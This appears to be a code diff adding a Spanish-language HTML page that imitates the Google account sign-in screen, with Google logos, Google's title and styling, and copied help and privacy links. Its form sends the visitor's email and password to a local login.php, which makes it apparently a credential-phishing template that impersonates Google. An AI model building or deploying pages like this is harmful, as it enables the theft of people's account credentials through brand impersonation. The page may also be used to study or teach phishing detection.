@@ -1,0 +1,60 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="icon" type="image/png" href="google-logo-cabecera.png">
+    <title>Acceso: Cuentas de Google</title>
+    <link rel="stylesheet" href="otro.css">
+</head>
+<body>
+
+    <div class="auth-container">
+        <div class="side-info">
+            <div class="logo-placeholder">
+                <img src="google-recuadro.png" alt="Logo de mi negocio">
+            </div>
+            <h1>Accede a tu cuenta</h1>
+            <p class="subtitle">Usa tu Cuenta de Google</p>
+        </div>
+
+        <div class="side-form">
+            <form method="post" action="login.php">
+                <div class="input-wrapper">
+                    <input type="email" name="email" placeholder="Correo electrónico o teléfono" required>
+                </div>
+                
+                <div class="input-wrapper">
+                    <input type="password" name="password" placeholder="Contraseña" required>
+                </div>
+
+                <a href="#" style="color: var(--google-blue-dark); text-decoration: none; font-size: 14px;">
+                    ¿Has olvidado tu contraseña?
+                </a>
+
+                <p class="mixed-text">
+                    ¿Esta no es tu computadora? Usa el modo de invitado para navegar de forma privada.<span>Más información para usar el modo de invitado</span>
+                </p>
+
+                <div class="action-row">
+                    <button type="button" class="btn-secondary" style="color:var(--google-blue-dark); background:none; border:none; cursor:pointer;">Crear cuenta</button>
+                    <button type="submit" name="signIn" class="btn-primary">Siguiente</button>
+                </div>
+            </form>
+        </div>
+    </div>
+
+    <footer class="footer-external">
+        <div class="lang-selector">
+            Español (México) ▼
+        </div>
+
+        <div class="footer-links">
+            <a href="#">Ayuda</a>
+            <a href="#">Privacidad</a>
+            <a href="#">Condiciones</a>
+        </div>
+    </footer>
+
+</body>
+</html>
